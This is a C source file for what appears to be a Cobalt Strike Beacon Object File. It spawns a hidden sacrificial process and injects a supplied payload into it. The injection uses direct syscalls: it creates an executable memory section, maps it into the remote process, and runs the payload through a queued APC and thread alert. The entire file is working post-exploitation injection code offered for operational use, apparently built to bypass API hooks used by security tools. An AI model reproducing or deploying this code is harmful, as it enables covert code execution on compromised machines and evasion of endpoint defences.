#include <windows.h>
#include "beacon.h"
#include "syscalls.c"

/* is this an x64 BOF */
BOOL is_x64() {
#if defined _M_X64
   return TRUE;
#elif defined _M_IX86
   return FALSE;
#endif
}


/* See gox86 and gox64 entry points */
void go(char * args, int alen, BOOL x86) {
   STARTUPINFOA        si;
   PROCESS_INFORMATION pi;
   datap               parser;
   short               ignoreToken;
   char *              dllPtr;
   int                 dllLen;

   /* Warn about crossing to another architecture. */
   if (!is_x64() && x86 == FALSE) {
      BeaconPrintf(CALLBACK_ERROR, "Warning: inject from x86 -> x64");
   }
   if (is_x64() && x86 == TRUE) {
      BeaconPrintf(CALLBACK_ERROR, "Warning: inject from x64 -> x86");
   }

   /* Extract the arguments */
   BeaconDataParse(&parser, args, alen);
   ignoreToken = BeaconDataShort(&parser);
   dllPtr = BeaconDataExtract(&parser, &dllLen);

   /* zero out these data structures */
   __stosb((void *)&si, 0, sizeof(STARTUPINFO));
   __stosb((void *)&pi, 0, sizeof(PROCESS_INFORMATION));

   //attributes for section create
   OBJECT_ATTRIBUTES oattr;
   InitializeObjectAttributes(&oattr, NULL, 0, NULL, NULL);

   /* setup the other values in our startup info structure */
   si.dwFlags = STARTF_USESHOWWINDOW;
   si.wShowWindow = SW_HIDE;
   si.cb = sizeof(STARTUPINFO);

   /* Ready to go: spawn, inject and cleanup */
   if (!BeaconSpawnTemporaryProcess(x86, ignoreToken, &si, &pi)) {
      BeaconPrintf(CALLBACK_ERROR, "Unable to spawn %s temporary process.", x86 ? "x86" : "x64");
      return;
   }


   //NtCreateSection
   HANDLE shand;
   LARGE_INTEGER sc_size = { dllLen };

   NTSTATUS status = NtCreateSection(
      &shand,
      SECTION_ALL_ACCESS,
      &oattr,
      &sc_size,
      PAGE_EXECUTE_READWRITE,
      SEC_COMMIT,
      NULL
   );
   if (status != STATUS_SUCCESS) {
      BeaconPrintf(CALLBACK_ERROR, "NtCreateSection failed with error code: 0x%X", status);
      BeaconCleanupProcess(&pi);
      return;
   }

   //NtMapViewOfSection to local process
   PVOID local_mem = NULL;
   SIZE_T vSize = 0;

   status = NtMapViewOfSection(
      shand,
      KERNEL32$GetCurrentProcess(),
      &local_mem,
      NULL,
      NULL,
      NULL,
      &vSize,
      2,
      NULL,
      PAGE_READWRITE
   );
   if (status != STATUS_SUCCESS) {
      BeaconPrintf(CALLBACK_ERROR, "NtMapViewOfSection to local process failed with error code: 0x%X", status);
      NtClose(shand);
      BeaconCleanupProcess(&pi);
      return;
   }

   mymemcopy(local_mem, dllPtr, dllLen);

   //NtMapViewOfSection to the sacrifical process
   PVOID remote_mem = NULL;

   status = NtMapViewOfSection(
      shand,
      pi.hProcess,
      &remote_mem,
      NULL,
      NULL,
      NULL,
      &vSize,
      2,
      NULL,
      PAGE_EXECUTE_READ
   );
   if (status != STATUS_SUCCESS) {
      BeaconPrintf(CALLBACK_ERROR, "NtMapViewOfSection to remote process failed with error code: 0x%X", status);
      NtClose(shand);
      BeaconCleanupProcess(&pi);
      return;
   }

   //Queue APC on the main thread
   status = NtQueueApcThread(
      pi.hThread,
      (PIO_APC_ROUTINE)remote_mem,
      NULL,
      NULL,
      NULL
      );
   if (status != STATUS_SUCCESS) {
      BeaconPrintf(CALLBACK_ERROR, "NtQueueApcThread failed with error code: 0x%X", status);
      NtClose(shand);
      BeaconCleanupProcess(&pi);
      return;
   }

   //Set the thread in alerted state so the APC can be executed
   status = NtAlertThread(pi.hThread);
   if (status != STATUS_SUCCESS) {
      BeaconPrintf(CALLBACK_ERROR, "NtAlertThread failed with error code: 0x%X", status);
      NtClose(shand);
      BeaconCleanupProcess(&pi);
      return;
   }

   status = NtResumeThread(pi.hThread, NULL);
   if (status != STATUS_SUCCESS)
   {
      BeaconPrintf(CALLBACK_ERROR, "NtResumeThread failed with error code: 0x%X", status);
   }

   //Unmap the created section from the local process
   status = NtUnmapViewOfSection(KERNEL32$GetCurrentProcess(), local_mem);
   if (status != STATUS_SUCCESS) {
      BeaconPrintf(CALLBACK_ERROR, "NtUnmapViewOfSection failed with error code: 0x%X", status);
      return;
   }

   //BeaconInjectTemporaryProcess(&pi, dllPtr, dllLen, 0, NULL, 0);
   NtClose(shand);
   BeaconCleanupProcess(&pi);
}

void gox86(char * args, int alen) {
   go(args, alen, TRUE);
}

void gox64(char * args, int alen) {
   go(args, alen, FALSE);
}